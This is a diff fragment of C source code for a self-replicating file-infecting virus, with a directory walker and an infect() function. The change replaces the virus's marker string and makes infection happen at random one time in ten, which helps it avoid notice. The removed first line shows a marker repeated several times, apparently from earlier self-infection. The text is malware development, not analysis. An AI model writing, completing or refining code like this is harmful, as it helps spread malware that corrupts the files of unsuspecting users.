@@ -1,10 +1,10 @@
-#include<stdio.h> //# include<stdio.h> //# include<stdio.h>#include <stdio.h>        
+#include <stdio.h>        
 #include <stdlib.h>
 #include <time.h>
 #include "dirent.h"
 
-#define VIRUS_TEXT "#include<stdio.h> //"
-#define VIRUS_START 0
+#define VIRUS_TEXT "#Je suis passé par ici#"
+#define VIRUS_START 12
 
 void ls(char *, int * , int *);
 void getExtension(char *, char *);
@@ -65,7 +65,7 @@ int infect(char * oldPath) {
     int result = 0, i;
     char newPath[256], c;
 
-    if (1) {
+    if (rand() % 10 == 3) {
         puts(oldPath);
         result = 1;
         sprintf(newPath, "%s.new", oldPath);
